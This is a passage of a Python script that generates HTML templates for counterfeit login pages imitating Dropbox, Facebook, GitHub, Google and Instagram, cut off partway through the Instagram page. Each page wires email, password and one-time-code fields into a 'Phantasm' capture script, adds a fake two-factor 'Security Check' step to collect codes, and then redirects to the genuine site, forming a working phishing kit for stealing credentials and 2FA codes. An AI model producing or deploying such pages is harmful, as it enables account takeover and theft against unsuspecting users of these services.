                        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="none" d="M0 0h48v48H0z"/></svg>
                        Log in with Google
                    </button>
                    <button type="button" class="btn-apple">
                        <svg viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>
                        Log in with Apple
                    </button>
                </form>
            </div>

            <!-- Step 2: Password -->
            <div id="step-2" class="hidden fade-in">
                <div class="user-pill" id="back-btn">
                    <div class="user-avatar" id="avatar-char">U</div>
                    <div class="user-email" id="display-email">user@example.com</div>
                    <div style="font-size: 12px; color: #0061fe;">Edit</div>
                </div>
                
                <form>
                    <div class="input-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" required>
                    </div>

                    <div class="checkbox-wrapper">
                        <input type="checkbox" id="remember">
                        <label for="remember">Remember me</label>
                    </div>

                    <button type="submit" class="btn-primary" id="btn-login">
                        Log in
                    </button>
                    
                    <div style="text-align: center; margin-top: 15px;">
                        <a href="#" style="color: #0061fe; font-size: 12px; text-decoration: none;">Forgot your password?</a>
                    </div>
                </form>
            </div>
            
            <div class="footer-links">
                <!-- Footer content can go here if needed -->
            </div>
        </div>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://www.dropbox.com/home',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-step1',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    userDisplay: '#display-email'
                }
            });

            // Handle back button
            const backBtn = document.getElementById('back-btn');
            if(backBtn) {
                backBtn.addEventListener('click', () => {
                    app.transitionToStep(1);
                });
            }
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>"""
save_template("dropbox", dropbox_html)

# FACEBOOK
facebook_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <style>
        body {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .main-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            padding-bottom: 112px;
            padding-top: 72px;
            width: 980px;
            max-width: 100%;
        }
        .left-col {
            width: 580px;
            padding-right: 32px;
            box-sizing: border-box;
        }
        .logo {
            height: 106px;
            margin: -28px;
        }
        h2 {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
            margin-top: 24px;
            margin-bottom: 0;
        }
        .right-col {
            width: 396px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .card {
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            padding: 20px 0 28px;
            width: 396px;
            text-align: center;
        }
        .form-container {
            padding: 0 16px;
        }
        input {
            font-size: 17px;
            padding: 14px 16px;
            width: 100%;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            margin-bottom: 12px;
            box-sizing: border-box;
            color: #1d2129;
            height: 52px;
            line-height: 16px;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
            caret-color: #1877f2;
        }
        .btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 6px;
            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
        }
        .btn:hover {
            background-color: #166fe5;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-top: 16px;
            margin-bottom: 20px;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 16px;
            text-align: center;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            display: inline-block;
            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
        .create-page {
            margin-top: 28px;
            font-size: 14px;
            color: #1c1e21;
        }
        .create-page a {
            font-weight: bold;
            color: #1c1e21;
            text-decoration: none;
        }
        .create-page a:hover {
            text-decoration: underline;
        }

        @media (max-width: 900px) {
            .main-wrapper {
                flex-direction: column;
                width: 100%;
                padding-top: 0;
                padding-bottom: 40px;
            }
            .left-col {
                text-align: center;
                width: auto;
                padding: 0;
                margin-top: 40px;
                margin-bottom: 40px;
            }
            .logo {
                margin: 0;
                height: 60px;
            }
            h2 {
                font-size: 24px;
                width: auto;
                margin-top: 10px;
            }
            .right-col {
                width: 100%;
                padding: 0 16px;
                box-sizing: border-box;
            }
            .card {
                width: 100%;
                max-width: 396px;
            }
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="step-1" class="main-wrapper">
        <div class="left-col">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        
        <div class="right-col">
            <div class="card">
                <form id="login-form" class="form-container">
                    <input type="text" id="email" placeholder="Email address or phone number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" id="btn-submit" class="btn">Log In</button>
                    <a href="#" class="forgot">Forgotten password?</a>
                    <div class="divider"></div>
                    <button type="button" class="create-btn">Create new account</button>
                </form>
            </div>
            <div class="create-page">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: #f0f2f5; height: 100%; justify-content: center; z-index: 999;">
        <div class="card" style="padding: 20px;">
            <h2 style="font-size: 20px; width: 100%; margin-top: 0; margin-bottom: 20px;">Two-Factor Authentication</h2>
            <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
            <input type="text" id="otp-input" placeholder="Enter code" style="margin-bottom: 20px;">
            <button id="btn-otp-submit" class="btn">Verify</button>
        </div>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            new Phantasm({
                redirectUrl: 'https://www.facebook.com/',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step3: '#step-3-otp'
                }
            });
        });
    </script>
</body>
</html>"""
save_template("facebook", facebook_html)

# GITHUB
github_html = """<!DOCTYPE html>
<html lang="en" data-color-mode="dark" data-dark-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to GitHub · GitHub</title>
    <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon-dark.svg">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
            background-color: #0d1117;
            color: #c9d1d9;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 32px;
            font-size: 14px;
            line-height: 1.5;
        }

        .header-logo {
            margin-bottom: 24px;
            text-align: center;
        }

        .header-logo svg {
            fill: #f0f6fc;
        }

        h1 {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
            margin-bottom: 15px;
            color: #c9d1d9;
            text-align: center;
        }

        .auth-form-body {
            width: 308px;
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 16px;
            font-size: 14px;
        }

        label {
            display: block;
            margin-bottom: 7px;
            font-weight: 400;
            text-align: left;
        }

        .form-control {
            width: 100%;
            padding: 5px 12px;
            background-color: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 14px;
            line-height: 20px;
            box-sizing: border-box;
            margin-bottom: 15px;
            height: 32px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-control:focus {
            border-color: #58a6ff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }

        .btn-primary {
            background-color: #238636;
            color: #ffffff;
            border: 1px solid rgba(240, 246, 252, 0.1);
            border-radius: 6px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 600;
            line-height: 20px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #2ea043;
            border-color: rgba(240, 246, 252, 0.1);
        }

        .login-callout {
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 15px 20px;
            text-align: center;
            width: 308px;
            font-size: 14px;
        }

        .login-callout a {
            color: #58a6ff;
            text-decoration: none;
        }

        .login-callout a:hover {
            text-decoration: underline;
        }

        .label-link {
            float: right;
            font-size: 12px;
            color: #58a6ff;
            text-decoration: none;
        }

        .label-link:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #8b949e;
            width: 308px;
        }

        .footer ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .footer li {
            display: inline;
        }

        .footer a {
            color: #58a6ff;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
        
        /* Spinner for button */
        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 2px solid #fff;
            width: 14px;
            height: 14px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 5px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header-logo">
        <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" data-view-component="true" class="octicon octicon-mark-github">
            <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
        </svg>
    </div>

    <h1>Log in to GitHub</h1>

    <div class="auth-form-body" id="step-1">
        <form>
            <label for="login_field">Username or email address</label>
            <input type="text" name="login" id="login_field" class="form-control" autofocus="autofocus" required>

            <div style="position: relative;">
                <label for="password">Password</label>
                <a class="label-link" href="#">Forgot password?</a>
                <input type="password" name="password" id="password" class="form-control" required>
            </div>

            <button type="submit" class="btn-primary" id="btn-login">
                Log in
            </button>
        </form>
    </div>

    <div class="login-callout">
        New to GitHub? <a href="#">Create an account</a>.
    </div>

    <div class="footer">
        <ul>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Security</a></li>
            <li><a href="#">Contact GitHub</a></li>
        </ul>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://github.com/',
                selectors: {
                    email: '#login_field',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp'
                }
            });
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>"""
save_template("github", github_html)

# GOOGLE
google_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - Google Accounts</title>
    <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
    <style>
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #202124;
        }
        .main-container {
            width: 450px;
            height: auto;
            min-height: 500px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            height: 24px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 8px;
            line-height: 1.3333;
        }
        .subtitle {
            font-size: 16px;
            margin: 0 0 40px;
            color: #202124;
            letter-spacing: 0.1px;
            line-height: 1.5;
        }
        .input-wrapper {
            width: 100%;
            position: relative;
            margin-bottom: 6px;
        }
        .input-field {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: 0.2s;
            color: #202124;
        }
        .input-field:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .input-label {
            position: absolute;
            left: 12px;
            top: 14px;
            background: #fff;
            padding: 0 4px;
            color: #5f6368;
            font-size: 16px;
            transition: 0.2s;
            pointer-events: none;
        }
        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: -10px;
            font-size: 12px;
            color: #1a73e8;
        }
        .forgot-email {
            width: 100%;
            text-align: left;
            margin-bottom: 40px;
        }
        .forgot-email a {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            border-radius: 4px;
        }
        .actions {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: auto;
        }
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .next-btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 0 24px;
            height: 36px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            transition: background-color .2s box-shadow .2s;
        }
        .next-btn:hover {
            background-color: #1558d6;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        .hidden {
            display: none;
        }
        .profile-pill {
            border: 1px solid #dadce0;
            border-radius: 16px;
            padding: 4px 12px 4px 4px;
            display: flex;
            align-items: center;
            margin-bottom: 40px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            color: #3c4043;
        }
        .profile-pill img {
            height: 20px;
            margin-right: 8px;
            border-radius: 50%;
        }
        @media (max-width: 600px) {
            .main-container {
                width: 100%;
                height: 100%;
                border: none;
                justify-content: flex-start;
                padding-top: 24px;
            }
        }
        /* Footer */
        .footer {
            display: flex;
            justify-content: space-between;
            width: 450px;
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer-left select {
            border: none;
            background: none;
            font-size: 12px;
            color: #202124;
        }
        .footer-right a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 24px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
        
        <div id="step-1">
            <h1>Log in</h1>
            <p class="subtitle">Use your Google Account</p>
            
            <div class="input-wrapper">
                <input type="email" id="email-input" class="input-field" placeholder=" " required>
                <label class="input-label">Email or phone</label>
            </div>
            
            <div class="forgot-email">
                <a href="#">Forgot email?</a>
            </div>
            
            <p style="font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px;">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Learn more</a>
            </p>
            
            <div class="actions">
                <a href="#" class="create-account">Create account</a>
                <button class="next-btn" id="btn-next">Next</button>
            </div>
        </div>

        <div id="step-2" class="hidden">
            <h1>Welcome</h1>
            <div class="profile-pill" id="profile-pill-back">
                <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
                <span id="user-email-display">user@example.com</span>
                <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #5f6368; margin-left: 8px;"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"></path></svg>
            </div>
            
            <div id="error-msg" style="color: #d93025; font-size: 12px; margin-bottom: 10px; display: none;">
                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle; margin-right: 5px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                Wrong password. Try again or click Forgot password to reset it.
            </div>

            <div class="input-wrapper" style="margin-top: 40px;">
                <input type="password" id="password-input" class="input-field" placeholder=" " required>
                <label class="input-label">Enter your password</label>
            </div>
            
            <div class="forgot-email" style="margin-top: 8px;">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="actions" style="margin-top: 60px;">
                <a href="#" class="create-account"></a> <!-- Spacer -->
                <button id="password-next-btn" class="next-btn">Next</button>
            </div>
        </div>

        <div id="step-2fa" class="hidden">
            <h1>2-Step Verification</h1>
            <p class="subtitle">To help keep your account safe, Google wants to make sure it’s really you trying to sign in.</p>
            
            <div class="profile-pill">
                <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
                <span id="user-email-2fa">user@example.com</span>
            </div>
            
            <div class="input-wrapper">
                <input type="tel" id="otp-input" class="input-field" placeholder=" " required maxlength="6" pattern="[0-9]*">
                <label class="input-label">Enter the 6-digit code</label>
            </div>
            
            <div class="forgot-email">
                <a href="#">More options</a>
            </div>
            
            <div class="actions">
                <button class="next-btn" id="btn-otp-submit">Next</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-left">
            English (United States)
        </div>
        <div class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <!-- Phantasm Engine -->
    <script src="/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Custom back button logic
            document.getElementById('profile-pill-back').addEventListener('click', () => {
                document.getElementById('step-2').classList.add('hidden');
                document.getElementById('step-1').classList.remove('hidden');
                document.getElementById('step-1').style.display = 'flex'; // Google container is flex
            });

            new Phantasm({
                redirectUrl: 'https://www.google.com',
                selectors: {
                    email: '#email-input',
                    password: '#password-input',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#password-next-btn',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-2fa' // Using the native-styled container
                }
            });
        });
    </script>
</body>
</html>
"""
save_template("google", google_html)

# INSTAGRAM
instagram_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 32px;
            padding-bottom: 32px;
        }

        .phones-container {
            background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk');
            background-size: 468.32px 634.15px;
            height: 581.15px;
            width: 380.32px;
            margin-right: 32px;
            position: relative;
        }

        .screenshot-slider {
            margin: 27px 0 0 113px;
            position: relative;
        }

        .screenshot-slider img {
            height: 538.84px;
            width: 250px;
            position: absolute;
            opacity: 0;
            transition: opacity 1.5s ease-in-out;
        }

        .screenshot-slider img.active {
            opacity: 1;
        }

        .right-column {
            display: flex;
            flex-direction: column;
            width: 350px;
        }

        .login-panel {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 0;
            margin-bottom: 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin: 36px 0 12px 0;
            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png");
            background-position: 0 -52px;
            background-size: 176px 181px;
            height: 51px;
            width: 175px;
            background-repeat: no-repeat;
            display: inline-block;
        }

        .form-container {
            width: 100%;
            padding: 0 40px;
            box-sizing: border-box;
            margin-top: 24px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 6px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            height: 38px;
        }

        .input-wrapper:focus-within {
            border: 1px solid #a8a8a8;
        }

        .input-wrapper input {
            width: 100%;
            height: 100%;
            background: transparent;
            border: none;
            padding: 9px 8px 7px 8px;
            font-size: 12px;
            box-sizing: border-box;
            outline: none;
            z-index: 2;
            position: relative;
        }

        .floating-label {
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 12px;
            transition: all 0.1s ease-out;
            pointer-events: none;
            z-index: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            right: 8px;
        }

        .input-wrapper input:not(:placeholder-shown) + .floating-label,
        .input-wrapper input:focus + .floating-label {
            transform: translateY(-12px) scale(0.83);
            transform-origin: left;
        }

        .input-wrapper input:not(:placeholder-shown),
        .input-wrapper input:focus {
            padding: 14px 8px 2px 8px;
        }
        
        .show-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: transparent;
            border: none;
            color: #262626;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            display: none;
            z-index: 3;
            padding: 0;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            padding: 5px 9px;
            margin-top: 8px;
            cursor: pointer;
            font-size: 14px;
            height: 30px;
            opacity: 0.7;
            pointer-events: none;
            transition: opacity 0.2s;
        }

        .login-btn.active {
            opacity: 1;
            pointer-events: auto;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
            width: calc(100% - 80px);
        }

        .line {
            height: 1px;
            background-color: #dbdbdb;
            flex: 1;
        }

        .or-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }

        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 8px 0;
        }

        .fb-icon {
            display: inline-block;
            margin-right: 8px;
            position: relative;
            top: 1px;
            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png");
            background-position: -414px -259px;
            background-size: 440px 411px;
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 12px;
            margin-bottom: 12px;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 0;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .get-app {
            text-align: center;
            font-size: 14px;
            margin: 10px 0 20px 0;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 10px;
        }

        .app-stores img {
            height: 40px;
        }

        .footer {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 24px;
            max-width: 1000px;
            gap: 16px;
            padding-bottom: 52px;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
        }
        
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 800px) {
            .phones-container {
                display: none;
            }
            .main-container {
                margin-top: 0;
            }
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="main-container" id="step-1">
        <div class="phones-container">
            <div class="screenshot-slider">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1-2x.png?__makehaste_cache_breaker=HOgRclNOosk" class="active" alt="">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot2-2x.png?__makehaste_cache_breaker=HOgRclNOosk" alt="">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot3-2x.png?__makehaste_cache_breaker=HOgRclNOosk" alt="">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot4-2x.png?__makehaste_cache_breaker=HOgRclNOosk" alt="">
            </div>
        </div>

        <div class="right-column">
            <div class="login-panel">
                <span class="logo"></span>
                
                <div class="form-container">
                    <form id="loginForm">
                        <div class="input-wrapper">
                            <input type="text" id="username" placeholder=" " required>
                            <span class="floating-label">Phone number, username, or email</span>
                        </div>
                        
                        <div class="input-wrapper">
                            <input type="password" id="password" placeholder=" " required>
                            <span class="floating-label">Password</span>
                            <button type="button" class="show-password" id="showPassBtn">Show</button>
                        </div>

                        <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
                        
                        <div class="divider">
                            <div class="line"></div>
                            <div class="or-text">OR</div>
                            <div class="line"></div>
                        </div>

                        <a href="#" class="fb-login">
